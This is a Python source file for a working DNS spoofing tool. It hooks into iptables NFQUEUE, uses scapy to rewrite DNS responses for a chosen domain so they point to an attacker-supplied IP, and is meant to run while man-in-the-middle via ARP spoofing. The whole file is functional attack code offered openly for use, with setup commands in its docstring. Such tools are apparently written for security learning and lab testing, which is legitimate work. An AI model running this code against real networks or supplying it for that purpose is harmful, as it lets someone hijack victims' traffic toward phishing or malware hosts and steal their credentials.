#!/usr/bin/env python3
"""
    dnsspoofer: This program intercepts and edits DNS requests then replaces the IP
                address returned by a DNS response to an IP address supplied by the user.
                This program is meant to be used when you are the man-in-the-middle between
                your target machine and the router (see arpspoof.py).
    Author: Yusef Karim

    * If you want to setup a queue on your machine locally, run:
        iptable -I INPUT -j NFQUEUE --queue-num 1
        iptable -I OUTPUT -j NFQUEUE --queue-num 1
    * Example HTTP site for testing:
        imagebam.com
"""
from os import getuid
from sys import exit
import argparse
from subprocess import call
from signal import signal, SIGINT
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.compat import raw
import netfilterqueue

global SPOOF_DOMAIN
global REDIRECT_ADDRESS

def enable_iptable_queue():
    ret_val = call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '1'])
    if(ret_val != 0):
        print("[-] Enabling iptables queue 1 failed. Try again or do it manually")
        exit(1)

    print("[+] Successfully enabled iptables queue rule")


def process_packet(pkt):
    scapy_pkt = IP(pkt.get_payload())
    # If the packet contains a DNS Resource Record (response) layer
    if(scapy_pkt.haslayer(DNSRR)):
        # Get the domain name the user was requesting from the DNS Question Record layer
        domain_name = scapy_pkt.getlayer(DNSQR).qname
        if(SPOOF_DOMAIN in domain_name.decode()):
            print("[+] Target has visited {}, redirecting them to {}".format(
                  SPOOF_DOMAIN, REDIRECT_ADDRESS))
            # Create a custom DNS Resource Record packet using scapy
            spoofed_response = DNSRR(rrname=domain_name, rdata=REDIRECT_ADDRESS)
            # Set the answer field to our spoofed answer
            scapy_pkt[DNS].an = spoofed_response
            # We only need one spoofed answer, so update the ancount field to reflect that
            scapy_pkt[DNS].ancount = 1
            # Delete the current packets chksum and len so it does not get dropped
            del scapy_pkt[IP].chksum
            del scapy_pkt[IP].len
            del scapy_pkt[UDP].chksum
            del scapy_pkt[UDP].len
            # Use the class instance to recalculate the chksum and len fields for us
            # Accepts a packet in bytes format, then casted back into bytes for payload
            scapy_pkt = raw(scapy_pkt.__class__(raw(scapy_pkt)))
            # Update the current packets payload with the payload of our spoofed one
            pkt.set_payload(scapy_pkt)

    pkt.accept()
    #pkt.drop()


def cleanup_and_exit(signum, frame):
    ret_val = call(['iptables', '-F', 'FORWARD'])
    if(ret_val != 0):
        print("[-] Disabling iptables queue failed. Run 'iptables -F FORWARD' manually")
        exit(1)

    print("[+] Successfully disabled iptables queue rule\n[+] Goodbye!")
    exit(0)

if __name__ == "__main__":
    signal(SIGINT, cleanup_and_exit)
    if(getuid() != 0):
        print("[-] This program must be run as root")
        exit(1)
    else:
        parser = argparse.ArgumentParser(description="DNS Spoofing Automation Tool")
        parser.add_argument("-d", "--domain", type=str, required=True,
                            help="Domain Name you want to spoof")
        parser.add_argument("-r", "--redirect", type=str, required=True,
                            help="IP Address you want to redirect the target too")
        args = parser.parse_args()
        SPOOF_DOMAIN = args.domain
        REDIRECT_ADDRESS = args.redirect
        print("[+] Starting DNS Spoof, press ctrl-c to quit")
        # Enable iptables queue then run the netfilter queue with specified callback
        enable_iptable_queue()
        print("[+] Redirecting target from {} to {}.".format(
              SPOOF_DOMAIN, REDIRECT_ADDRESS))
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(1, process_packet)
        queue.run()

